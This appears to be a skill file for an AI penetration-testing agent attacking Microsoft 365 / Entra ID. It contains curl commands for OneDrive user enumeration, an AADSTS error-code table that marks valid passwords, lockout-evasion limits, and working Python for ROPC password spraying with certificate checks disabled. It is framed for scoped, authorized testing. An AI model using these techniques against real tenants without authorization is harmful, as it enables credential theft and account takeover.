---
name: hunt-m365
description: Microsoft 365 / Entra ID attack - tenant discovery, user enumeration via OneDrive differential (2026 verified), AADSTS code reference, Smart Lockout math (hard cap 1-2 attempts/user), ROPC validation, Conditional Access mapping. Wiki-first, FIND schema output.
---

# Hunt: M365 / Entra ID

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "M365 Entra ID Azure AD password spray" via wiki-search MCP -> read matching technique page if found.
```
Apply known spray techniques and Conditional Access bypass patterns already documented.


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope for credential testing
- Read Deadends.md - check if spray already run against this tenant

## When to Use
Target has: `*.onmicrosoft.com`, `*-my.sharepoint.com`, `login.microsoftonline.com` redirects, `enterpriseregistration.*` records, or "Microsoft 365" in tech-stack notes.

## AADSTS Code Reference (Memorize)

| Code | Meaning | Lockout hit? | Action |
|------|---------|-------------|--------|
| 50034 | User does not exist | NO | Skip - remove from spray list |
| 50126 | Wrong password | YES (+1) | User exists - try alternate later |
| 50053 | Account locked (Smart Lockout) | n/a | Pre-existing lockout - flag to client; do NOT retry |
| 53003 | CA blocked token issuance | YES (+1) | **PASSWORD VALID** |
| 50076 | MFA required | YES (+1) | **PASSWORD VALID** |
| 50079 | Strong auth required | YES (+1) | **PASSWORD VALID** |
| 50158 | External auth required | YES (+1) | **PASSWORD VALID** |
| 530003 | Device-state required | YES (+1) | **PASSWORD VALID** |

Codes {53003, 50076, 50079, 50158, 530003} = password confirmed valid. Microsoft only returns these AFTER credential validation.

## Smart Lockout Math (Hard Cap Discipline)
- Default: 10 failed attempts in 10 min -> lockout
- Counter shared across ALL flows (ROPC + SAML + IMAP + EWS)
- **Hard cap: <=1-2 password attempts per user per engagement**
- With 1 attempt/user, lockout is mathematically impossible
- Any AADSTS50053 = pre-existing lockout from another actor

## Tenant Discovery
```bash
msftrecon -d client.example
# Key fields: Tenant ID, Namespace Type (Managed = ROPC works | Federated = ADFS)
# SharePoint Detected: Yes -> OneDrive enum available
```

## User Enumeration (OneDrive Differential - Verified May 2026)
```bash
# 200 with ~57KB body = user EXISTS (licensed)
# 404 with 0 bytes = user DOES NOT EXIST
curl -sk "https://<tenant>-my.sharepoint.com/personal/<user>_<domain>_com/_layouts/15/onedrive.aspx"

# Zero auth attempts -- zero lockout impact
```

Signal: OneDrive 404 + ROPC AADSTS50126 = functional/shared mailbox account (no OneDrive license, has password) = prime target for spray (historically MFA-exempt).

## ROPC Validation (Single-Attempt Pattern)
```python
import urllib.request, urllib.parse, ssl, json, os

HARD_CAP = 1  # Never higher
ATTEMPT_FILE = "engagement_log/o365_attempts.json"

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body,
        method="POST"
    )
    
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=15)
        result = json.loads(resp.read())
        token_result = {"status": "VALID_TOKEN", "token": result.get("access_token","")[:20]+"..."}
    except urllib.error.HTTPError as e:
        err = json.loads(e.read())
        code = err.get("error_codes", [0])[0]
        token_result = {"status": "ERROR", "code": code, "desc": err.get("error_description","")[:80]}
    
    state[email.lower()] = state.get(email.lower(), 0) + 1
    with open(ATTEMPT_FILE, "w") as f:
        json.dump(state, f)
    
    return token_result
```

## Conditional Access Mapping
After finding valid credential (AADSTS53003/50076/etc), document CA policy:
- Note which client_id variants are tried (Graph PS, Azure CLI, Office)
- Note if CA is per-app or universal
- If universal CA: document as "valid credential, external access blocked by CA - phishing/AiTM required for exploitation"

## FIND Output

If valid credential found (AADSTS50076/53003/etc):
```
Create Vulns/Research/FIND-XXX-HIGH-m365-valid-credential-<tenant>.md
Note: CRITICAL if CA bypassed and token obtained; HIGH if password valid but CA blocks
Add row to Vuln-index.md
```

If unlimited spray endpoint found (no MFA, no rate limit):
```
Create Vulns/Research/FIND-XXX-HIGH-m365-no-ratelimit-<endpoint>.md
```

If path exhausted (all users non-existent or locked):
```
Append to Deadends.md: - [ ] M365 spray on <tenant> -- all users AADSTS50034 or pre-locked, tenant hardened
```

**Distill to wiki (when confirmed):** if the finding is a reusable Conditional Access bypass or OneDrive enumeration method, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/cloud/azure-ad-enumerate.md` (Conditional Access bypass: `--target-page techniques/cloud/azure-ad-conditional-access-policy.md`). Promote later via `scripts/wiki-promote.py`.

Report: Status + files created.
